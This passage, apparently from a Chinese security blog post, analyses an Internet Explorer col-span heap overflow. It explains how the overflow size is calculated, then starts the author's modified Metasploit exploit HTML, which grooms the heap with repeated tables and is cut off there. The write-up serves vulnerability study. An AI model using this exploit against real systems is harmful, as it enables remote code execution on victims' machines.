<p><img src="http://pic.giantbranch.cn/1506333816847.jpg" alt></p>
<p>那就是通过下面这个覆盖的</p>
<p><img src="http://pic.giantbranch.cn/1506334215517.jpg" alt></p>
<p>那么覆盖大小这么算呢</p>
<p>heap+A+B+0xC就是0x100+0x108+0x108+0xc = 0x21c,因为A，B字符串有堆头的8个字节</p>
<p>其实之前的span为19足够覆盖的了</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(<span class="number">0x1c</span>*<span class="number">19</span>)</span><br><span class="line">'<span class="number">0x214</span>'</span><br></pre></td></tr></table></figure>

<p>覆盖+8的位置就是，刚好</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x214</span>+<span class="number">8</span> = <span class="number">0x21c</span></span><br></pre></td></tr></table></figure>

<p>那整个过程就清楚了，但好像19触发不了，应该值没变不会进入那个流程，应该44确保可以触发那个流程吧</p>
<p>我对msf的代码添加了信息泄露，同时修改了rop（这个重新自己用mona生成后根据泄露的基址调整的）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"bUYP"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"1"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"2"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"3"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"5"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"6"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"7"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"8"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"9"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"10"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"11"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"12"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"13"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"14"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"15"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"16"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"17"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"18"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"19"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"21"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"22"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"23"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"24"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"25"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"26"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"27"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"28"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"29"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"30"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"31"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"32"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"33"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"34"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"35"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"36"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"37"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"38"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"39"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"40"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"41"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"42"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"43"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"44"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"45"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"46"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"47"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"48"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"49"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"50"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"51"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"52"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"53"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"54"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"55"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"56"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp 